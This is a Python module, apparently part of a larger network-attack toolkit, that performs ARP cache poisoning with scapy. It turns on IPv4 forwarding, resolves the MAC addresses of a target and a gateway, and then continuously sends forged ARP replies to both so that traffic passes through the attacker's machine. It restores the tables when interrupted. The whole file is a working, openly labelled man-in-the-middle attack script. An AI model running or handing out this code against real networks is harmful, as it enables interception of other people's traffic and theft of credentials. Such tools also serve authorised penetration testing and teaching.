#!/usr/bin/env python3
import os
import subprocess
import sys
import time
from core.banner import info, success, warn, error
from core.checker import check_root

def enable_ip_forwarding():
    ip_forward_path = '/proc/sys/net/ipv4/ip_forward'
    try:
        if os.path.exists(ip_forward_path):
            with open(ip_forward_path, 'r') as f:
                status = f.read().strip()
            if status != '1':
                info('Enabling IPv4 forwarding in kernel (/proc/sys/net/ipv4/ip_forward)...')
                with open(ip_forward_path, 'w') as f:
                    f.write('1')
                success('IPv4 forwarding enabled.')
            else:
                info('IPv4 forwarding is already active.')
    except Exception as e:
        warn(f"Could not automatically set IPv4 forwarding: {e}. Run 'sysctl -w net.ipv4.ip_forward=1'")

def get_mac(ip, interface=None):
    import scapy.all as scapy
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst='ff:ff:ff:ff:ff:ff')
    packet = broadcast / arp_request
    kwargs = {'timeout': 2, 'verbose': False}
    if interface:
        kwargs['iface'] = interface
    answered = scapy.srp(packet, **kwargs)[0]
    if answered:
        return answered[0][1].hwsrc
    return None

def spoof(target_ip, spoof_ip, target_mac=None):
    import scapy.all as scapy
    if not target_mac:
        target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)

def restore(destination_ip, source_ip, dest_mac=None, src_mac=None):
    import scapy.all as scapy
    if not dest_mac:
        dest_mac = get_mac(destination_ip)
    if not src_mac:
        src_mac = get_mac(source_ip)
    if dest_mac and src_mac:
        packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=dest_mac, psrc=source_ip, hwsrc=src_mac)
        scapy.send(packet, count=4, verbose=False)

def run(args):
    check_root(exit_on_failure=True)
    target_ip = args.target
    gateway_ip = args.spoof or args.gateway
    interface = args.interface
    if not target_ip or not gateway_ip:
        error('Both target IP (-t) and gateway/spoof IP (-s / -g) are required.')
        return 1
    try:
        import scapy.all as scapy
    except ImportError:
        error('Scapy library is missing. Install via: pip install scapy')
        return 1
    enable_ip_forwarding()
    info(f'Resolving MAC address for target:  {target_ip}...')
    target_mac = get_mac(target_ip, interface)
    if not target_mac:
        error(f'Could not resolve MAC address for target host {target_ip}. Is the host up?')
        return 1
    success(f'Target MAC:  {target_mac}')
    info(f'Resolving MAC address for gateway: {gateway_ip}...')
    gateway_mac = get_mac(gateway_ip, interface)
    if not gateway_mac:
        error(f'Could not resolve MAC address for gateway {gateway_ip}. Is the gateway reachable?')
        return 1
    success(f'Gateway MAC: {gateway_mac}')
    info('Initiating ARP cache poisoning attack. Press Ctrl+C to safely terminate and restore tables.')
    sent_count = 0
    try:
        while True:
            spoof(target_ip, gateway_ip, target_mac)
            spoof(gateway_ip, target_ip, gateway_mac)
            sent_count += 2
            sys.stdout.write(f'\r[+] Sent forged ARP packets: {sent_count}')
            sys.stdout.flush()
            time.sleep(args.interval)
    except KeyboardInterrupt:
        print('\n')
        warn('Termination requested by user. Restoring legitimate ARP tables...')
        restore(target_ip, gateway_ip, target_mac, gateway_mac)
        restore(gateway_ip, target_ip, gateway_mac, target_mac)
        success('ARP tables restored. MITM state cleared successfully.')
        return 0
